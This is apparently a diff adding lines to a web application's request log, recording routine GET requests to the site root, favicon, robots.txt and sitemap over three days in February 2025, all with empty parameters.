+[INFO][2025-02-16 17:05:05,187][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 18:11:55,783][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 18:18:42,247][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 18:18:44,646][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 18:19:42,654][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 19:53:47,573][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 23:21:58,829][middleware.py:13]Received GET request to /i/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 08:52:06,150][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 08:52:26,365][middleware.py:13]Received GET request to /favicon.ico from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 08:52:27,865][middleware.py:13]Received GET request to /robots.txt from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 08:52:28,915][middleware.py:13]Received GET request to /sitemap.xml from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 08:53:26,956][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 10:27:11,343][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 10:27:32,072][middleware.py:13]Received GET request to /favicon.ico from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 10:27:34,144][middleware.py:13]Received GET request to /robots.txt from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 10:27:36,342][middleware.py:13]Received GET request to /sitemap.xml from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 10:32:23,723][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 10:34:22,369][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 10:34:24,767][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 10:35:51,200][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 10:39:01,281][middleware.py:13]Received GET request to /favicon.ico from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 10:39:20,918][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 10:40:04,782][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 10:40:08,999][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 10:41:10,755][middleware.py:13]Received GET request to /favicon.ico from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 10:53:58,837][middleware.py:13]Received GET request to /favicon.ico from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 11:49:47,787][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 11:58:36,958][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 11:58:38,623][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 14:32:00,261][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 17:52:15,555][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 18:02:54,428][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 23:34:21,924][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 23:38:46,131][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-17 23:44:30,567][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:08:15,499][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:47:13,242][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:47:13,974][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:49:04,691][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:49:05,199][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:50:57,202][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:50:57,679][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:51:15,317][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:51:16,860][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:52:15,634][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:53:58,204][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:54:04,286][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:57:47,814][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:57:49,969][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 01:58:49,414][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:03:28,293][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:03:30,413][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:04:28,302][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:08:52,561][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:08:59,192][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:09:48,193][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:09:48,629][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:11:52,896][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:11:55,019][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:12:42,228][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:14:06,071][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:14:09,094][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:14:09,662][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:14:17,116][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:15:13,851][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:20:24,671][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 02:20:31,164][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 03:26:42,809][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 04:07:54,884][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 04:42:28,528][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 04:50:55,538][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 04:56:31,480][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 05:13:53,493][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 11:01:36,311][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 11:08:26,354][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 11:08:27,801][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 11:09:28,950][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 11:43:56,044][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 13:11:39,902][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-18 13:24:10,070][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
